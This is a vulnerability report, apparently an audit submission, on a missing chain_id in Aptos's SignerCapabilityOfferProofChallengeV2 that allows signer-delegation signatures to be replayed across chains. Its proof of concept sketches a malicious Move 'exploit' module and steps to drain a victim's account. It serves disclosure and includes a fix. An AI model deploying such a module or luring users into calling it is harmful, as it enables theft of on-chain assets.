### Title
Missing `chain_id` in `SignerCapabilityOfferProofChallengeV2` Enables Cross-Chain Replay of Signer Capability Delegation — (`aptos-move/framework/aptos-framework/sources/account/account.move`)

---

### Summary

`SignerCapabilityOfferProofChallengeV2`, the struct signed to authorize signer-capability delegation via `offer_signer_capability`, omits the `chain_id` field that its sibling struct `RotationCapabilityOfferProofChallengeV2` explicitly includes. A valid signature produced on one Aptos chain (e.g., testnet) is therefore cryptographically valid on every other Aptos chain (e.g., mainnet) for the same account at the same sequence number. An attacker who obtains such a signature can replay it through a malicious contract to silently install themselves as the authorized signer of a victim account on a different chain, then drain assets or rotate the victim's key.

---

### Finding Description

The two "V2" proof-challenge structs are defined side-by-side:

```move
/// This V2 struct adds the `chain_id` and `source_address` to the challenge message,
/// which prevents replaying the challenge message.
struct RotationCapabilityOfferProofChallengeV2 has drop {
    chain_id: u8,          // ← chain binding present
    sequence_number: u64,
    source_address: address,
    recipient_address: address,
}

struct SignerCapabilityOfferProofChallengeV2 has copy, drop {
    sequence_number: u64,
    source_address: address,
    recipient_address: address,
    // ← chain_id ABSENT
}
``` [1](#0-0) 

The comment on `RotationCapabilityOfferProofChallengeV2` explicitly states that `chain_id` was added to prevent replay. `SignerCapabilityOfferProofChallengeV2` was never given the same treatment.

`offer_signer_capability` constructs the challenge without `chain_id` and verifies the signature:

```move
let proof_challenge = SignerCapabilityOfferProofChallengeV2 {
    sequence_number: get_sequence_number(source_address),
    source_address,
    recipient_address,
};
verify_signed_message(
    source_address, account_scheme, account_public_key_bytes,
    signer_capability_sig_bytes, proof_challenge);
// ...
account_resource.signer_capability_offer.for.swap_or_fill(recipient_address);
``` [2](#0-1) 

The BCS-serialized message that Alice signs is:

```
0x1 || "account" || "SignerCapabilityOfferProofChallengeV2"
|| sequence_number || source_address || recipient_address
```

This byte string is **identical on every Aptos chain** for the same account at the same sequence number. No chain discriminator is mixed in.

The e2e test confirms the exact serialization format used:

```rust
let proof_struct = SignerCapabilityOfferProofChallengeV2 {
    account_address: CORE_CODE_ADDRESS,
    module_name: String::from("account"),
    struct_name: String::from("SignerCapabilityOfferProofChallengeV2"),
    sequence_number: 0,
    source_address: *account_alice.address(),
    recipient_address: *account_bob.address(),
    // no chain_id field
};
``` [3](#0-2) 

Once the offer is installed, `create_authorized_signer` lets the recipient obtain a live `signer` for the victim account:

```move
public fun create_authorized_signer(account: &signer, offerer_address: address): signer {
    assert!(account_resource.signer_capability_offer.for.contains(&addr), ...);
    create_signer(offerer_address)
}
``` [4](#0-3) 

---

### Impact Explanation

Once the attacker holds a valid `SignerCapabilityOfferProofChallengeV2` signature for Alice (obtained from any chain), they can:

1. Deploy a malicious Move module on the target chain that hardcodes the captured signature.
2. Trick Alice into calling that module (e.g., via a phishing dApp) at a moment when Alice's sequence number on the target chain matches the one embedded in the captured signature.
3. The malicious module calls `offer_signer_capability` passing Alice's `&signer` (which it receives as a call argument) and the replayed signature bytes.
4. `verify_signed_message` succeeds — no chain_id is checked.
5. Alice's `signer_capability_offer` is now set to the attacker's address.
6. The attacker calls `create_authorized_signer` to obtain Alice's signer and can: transfer all APT and fungible assets, rotate Alice's authentication key (permanent lockout), or perform any other privileged action.

The impact is **direct theft or permanent freezing of user-controlled on-chain assets** and **unauthorized transaction execution** — both within the allowed impact gate.

---

### Likelihood Explanation

- The attack requires the attacker to obtain a valid `SignerCapabilityOfferProofChallengeV2` signature from the victim on any chain. This is realistic: the same private key is typically used on testnet and mainnet; a testnet dApp interaction or a phishing site can harvest the signature.
- The victim's sequence number on the target chain must match the one in the captured signature. For new accounts (sequence number 0) this is trivially satisfied. For older accounts the attacker must time the attack, but sequence numbers are public and predictable.
- The malicious-contract vector requires only one additional user interaction (calling the attacker's contract), which is a standard phishing scenario.
- The function `offer_signer_capability` is a public entry function callable by any unprivileged transaction.

---

### Recommendation

Add `chain_id: u8` to `SignerCapabilityOfferProofChallengeV2`, mirroring the fix already applied to `RotationCapabilityOfferProofChallengeV2`:

```move
struct SignerCapabilityOfferProofChallengeV2 has copy, drop {
    chain_id: u8,          // ← add this field
    sequence_number: u64,
    source_address: address,
    recipient_address: address,
}
```

And populate it in `offer_signer_capability`:

```move
let proof_challenge = SignerCapabilityOfferProofChallengeV2 {
    chain_id: chain_id::get(),   // ← add this
    sequence_number: get_sequence_number(source_address),
    source_address,
    recipient_address,
};
```

This is a breaking change to the signed message format; existing off-chain tooling that constructs the challenge struct must be updated accordingly.

---

### Proof of Concept

**Setup**: Alice has the same Ed25519 key pair on testnet (chain_id=2) and mainnet (chain_id=1). Both accounts are at sequence number 0.

**Step 1 — Harvest signature on testnet**

Alice calls `offer_signer_capability` on testnet, delegating to Attacker. The signed challenge bytes are:

```
BCS( { 0x1, "account", "SignerCapabilityOfferProofChallengeV2",
       seq=0, source=Alice, recipient=Attacker } )
```

No chain_id is included. The attacker records `sig_bytes`.

**Step 2 — Deploy malicious module on mainnet**

```move
module attacker::exploit {
    use aptos_framework::account;

    const SIG: vector<u8> = /* sig_bytes from testnet */;
    const PK:  vector<u8> = /* Alice's public key */;

    public entry fun pwn(alice: &signer) {
        account::offer_signer_capability(
            alice,
            SIG,
            0,          // ED25519_SCHEME
            PK,
            @attacker
        );
    }
}
```

**Step 3 — Trick Alice into calling `pwn` on mainnet**

Alice's mainnet sequence number is still 0. The mainnet `offer_signer_capability` reconstructs:

```
BCS( { 0x1, "account", "SignerCapabilityOfferProofChallengeV2",
       seq=0, source=Alice, recipient=Attacker } )
```

This is byte-for-byte identical to the testnet message. `verify_signed_message` passes. Alice's mainnet `signer_capability_offer` is now set to `@attacker`.

**Step 4 — Drain Alice's mainnet account**

```move
let alice_signer = account::create_authorized_signer(&attacker_signer, @alice);
aptos_account::transfer(&alice_signer, @attacker, alice_balance);
```

The attacker now controls Alice's mainnet account without ever having Alice's mainnet private key.

### Citations

**File:** aptos-move/framework/aptos-framework/sources/account/account.move (L145-159)
```text
    /// This struct stores the challenge message that should be signed by the source account, when the source account
    /// is delegating its rotation capability to the `recipient_address`.
    /// This V2 struct adds the `chain_id` and `source_address` to the challenge message, which prevents replaying the challenge message.
    struct RotationCapabilityOfferProofChallengeV2 has drop {
        chain_id: u8,
        sequence_number: u64,
        source_address: address,
        recipient_address: address,
    }

    struct SignerCapabilityOfferProofChallengeV2 has copy, drop {
        sequence_number: u64,
        source_address: address,
        recipient_address: address,
    }
```

**File:** aptos-move/framework/aptos-framework/sources/account/account.move (L954-977)
```text
    public entry fun offer_signer_capability(
        account: &signer,
        signer_capability_sig_bytes: vector<u8>,
        account_scheme: u8,
        account_public_key_bytes: vector<u8>,
        recipient_address: address
    ) acquires Account {
        let source_address = signer::address_of(account);
        ensure_resource_exists(source_address);
        assert!(exists_at(recipient_address), error::not_found(EACCOUNT_DOES_NOT_EXIST));

        // Proof that this account intends to delegate its signer capability to another account.
        let proof_challenge = SignerCapabilityOfferProofChallengeV2 {
            sequence_number: get_sequence_number(source_address),
            source_address,
            recipient_address,
        };
        verify_signed_message(
            source_address, account_scheme, account_public_key_bytes, signer_capability_sig_bytes, proof_challenge);

        // Update the existing signer capability offer or put in a new signer capability offer for the recipient.
        let account_resource = &mut Account[source_address];
        account_resource.signer_capability_offer.for.swap_or_fill(recipient_address);
    }
```

**File:** aptos-move/framework/aptos-framework/sources/account/account.move (L1029-1040)
```text
    public fun create_authorized_signer(account: &signer, offerer_address: address): signer acquires Account {
        assert_account_resource_with_error(offerer_address, ENO_SUCH_SIGNER_CAPABILITY);
        // Check if there's an existing signer capability offer from the offerer.
        let account_resource = &Account[offerer_address];
        let addr = signer::address_of(account);
        assert!(
            account_resource.signer_capability_offer.for.contains(&addr),
            error::not_found(ENO_SUCH_SIGNER_CAPABILITY)
        );

        create_signer(offerer_address)
    }
```

**File:** aptos-move/e2e-move-tests/src/tests/offer_signer_capability.rs (L33-45)
```rust
    let proof_struct = SignerCapabilityOfferProofChallengeV2 {
        account_address: CORE_CODE_ADDRESS,
        module_name: String::from("account"),
        struct_name: String::from("SignerCapabilityOfferProofChallengeV2"),
        sequence_number: 0,
        source_address: *account_alice.address(),
        recipient_address: *account_bob.address(),
    };

    let proof_struct_bytes = bcs::to_bytes(&proof_struct);
    let signature = account_alice
        .privkey
        .sign_arbitrary_message(&proof_struct_bytes.unwrap());
```
